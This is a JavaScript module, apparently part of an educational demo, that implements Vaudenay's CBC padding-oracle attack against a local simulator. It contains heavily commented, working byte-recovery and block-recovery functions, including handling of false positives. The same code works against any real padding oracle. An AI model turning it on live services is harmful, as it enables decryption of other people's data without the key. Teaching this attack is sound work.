// The padding-oracle attack itself — Vaudenay (Eurocrypt 2002).
//
// The attack uses one fact about CBC: P_n = D(C_n) XOR C_{n-1}. The
// attacker controls C_{n-1} completely (it's just bytes on the wire); the
// real D(C_n) is fixed by the key. So if the attacker can find a C_{n-1}
// such that the resulting plaintext ends in a valid PKCS7 pad — most
// likely 0x01 — they've learned what D(C_n)'s last byte is, which means
// they've also learned the real plaintext's last byte (XOR with the real
// C_{n-1}). Repeat byte-by-byte to recover the entire block.
//
// recoverByte    — single byte recovery via the oracle (~128 queries
//                  average, 256 worst case, with early exit). Handles the
//                  0x02 0x02 false-positive via a 2-query confirmation.
// recoverBlock   — full 16-byte block recovery (~2048 queries average).
//                  Progress callback fires per byte so the page UI can
//                  animate the reveal.
//
// Implementation notes. The attacker doesn't know the key. It doesn't
// know the plaintext. It only knows (a) the target ciphertext block C
// and the real IV from the simulator, and (b) the oracle responses for
// any (iv, C) it sends. Everything below is derived from those two
// inputs.

import { query, getTargetCiphertext } from "./po_simulator.js";

// Recover a single plaintext byte at position `targetBytePos` (0-indexed
// within the 16-byte block). `knownBytes` is a Uint8Array of length 16
// holding the already-recovered plaintext bytes for positions
// targetBytePos+1 .. 15. (Lower positions can be undefined / 0.)
//
// Returns { byte, queries } — the recovered plaintext byte and the
// number of oracle queries this recovery cost.
//
// The math:
//   We choose a forged IV' such that the decrypted block ends in valid
//   PKCS7. Specifically we target padding length P = 16 - targetBytePos
//   (so for the last byte P=1, second-to-last P=2, etc).
//
//   For bytes already known (positions targetBytePos+1..15), set
//     IV'[i] = D(C)[i] XOR P
//           = (IV_real[i] XOR knownBytes[i]) XOR P
//   (because D(C)[i] = IV_real[i] XOR plaintext[i], and we want the
//   resulting plaintext byte at i to be P).
//
//   For positions < targetBytePos, IV'[i] can be anything (we keep the
//   real IV bytes — the simulator's PKCS7 check only looks at the last P
//   bytes, so the earlier bytes don't affect the response).
//
//   For position targetBytePos itself, we sweep all 256 candidates. The
//   one that produces "ok" tells us D(C)[targetBytePos] XOR candidate = P,
//   so D(C)[targetBytePos] = candidate XOR P, and therefore
//   plaintext[targetBytePos] = D(C)[targetBytePos] XOR IV_real[targetBytePos]
//                            = candidate XOR P XOR IV_real[targetBytePos].
export async function recoverByte(targetBytePos, knownBytes) {
  if (!Number.isInteger(targetBytePos) || targetBytePos < 0 || targetBytePos > 15) {
    throw new Error("targetBytePos must be 0..15");
  }
  if (!(knownBytes instanceof Uint8Array) || knownBytes.length !== 16) {
    throw new Error("knownBytes must be Uint8Array(16)");
  }

  const { iv_hex, ct_hex } = await getTargetCiphertext();
  const ivReal = _hexToBytes(iv_hex);

  // Padding length we're forging the plaintext to end in.
  const P = 16 - targetBytePos;
  // Forged IV — initialised from the real IV so positions < targetBytePos
  // don't affect the response. Positions > targetBytePos get overwritten
  // with the values that force the plaintext suffix to equal P repeated.
  const forgedIv = new Uint8Array(ivReal);
  for (let i = targetBytePos + 1; i < 16; i++) {
    // D(C)[i] = IV_real[i] XOR plaintext[i] (the real plaintext byte).
    // We want plaintext[i] under our forged IV to equal P.
    // So forgedIv[i] = D(C)[i] XOR P = IV_real[i] XOR knownBytes[i] XOR P.
    forgedIv[i] = ivReal[i] ^ knownBytes[i] ^ P;
  }

  let queries = 0;
  for (let candidate = 0; candidate < 256; candidate++) {
    forgedIv[targetBytePos] = candidate;
    const ivHexForged = _bytesToHex(forgedIv);
    queries += 1;
    const resp = await query(ivHexForged, ct_hex);
    if (resp !== "bad_padding") {
      // Candidate produced valid PKCS7. Most of the time this means the
      // last `P` bytes all equal P — i.e. our forgery worked exactly.
      //
      // Edge case for P=1: the decrypted plaintext might *accidentally*
      // end in 0x02 0x02 — i.e. the second-to-last byte (which we left as
      // ivReal[14] XOR D(C)[14]) happens to equal 0x02, and our forged
      // last byte also produces 0x02. To disambiguate: perturb the
      // second-to-last forged IV byte and re-query. If the response is
      // still not "bad_padding", the suffix was truly P=1 (last byte =
      // 0x01) — changing the second-to-last byte couldn't have broken a
      // single-byte pad. If the response is now "bad_padding", the suffix
      // had been 0x02 0x02 and we caught the false positive — keep
      // sweeping.
      if (P === 1 && targetBytePos > 0) {
        const perturbed = new Uint8Array(forgedIv);
        perturbed[targetBytePos - 1] ^= 0xff; // arbitrary non-zero perturbation
        queries += 1;
        const resp2 = await query(_bytesToHex(perturbed), ct_hex);
        if (resp2 === "bad_padding") {
          // False positive — was 0x02 0x02. Keep sweeping.
          continue;
        }
      }
      // Real hit. Derive the plaintext byte.
      const ptByte = candidate ^ P ^ ivReal[targetBytePos];
      return { byte: ptByte & 0xff, queries };
    }
  }
  throw new Error(
    `recoverByte: oracle returned bad_padding for all 256 candidates at position ${targetBytePos}. ` +
    `Either the simulator is misconfigured or knownBytes is wrong.`
  );
}

// Recover all 16 bytes of the target block. `progressCallback(i, byte)`
// fires after each byte is recovered (i counts down from 15 to 0). Used
// by the step-5 widget to animate the reveal.
//
// Returns { plaintext, totalQueries } — plaintext is a Uint8Array(16)
// of the recovered bytes; totalQueries is the cumulative oracle hit
// count.
export async function recoverBlock(progressCallback) {
  const known = new Uint8Array(16);
  let totalQueries = 0;
  for (let i = 15; i >= 0; i--) {
    const { byte, queries } = await recoverByte(i, known);
    known[i] = byte;
    totalQueries += queries;
    if (typeof progressCallback === "function") {
      try {
        await progressCallback(i, byte, totalQueries);
      } catch (_e) {
        // UI callback shouldn't kill the attack — swallow and continue.
      }
    }
  }
  return { plaintext: known, totalQueries };
}

// ---- helpers ----

function _bytesToHex(arr) {
  return Array.from(arr).map((b) => b.toString(16).padStart(2, "0")).join("");
}
function _hexToBytes(hex) {
  const clean = String(hex).replace(/\s+/g, "").toLowerCase();
  if (!/^[0-9a-f]*$/.test(clean) || clean.length % 2 !== 0) {
    throw new Error("invalid hex");
  }
  const out = new Uint8Array(clean.length / 2);
  for (let i = 0; i < clean.length; i += 2) {
    out[i / 2] = parseInt(clean.slice(i, i + 2), 16);
  }
  return out;
}
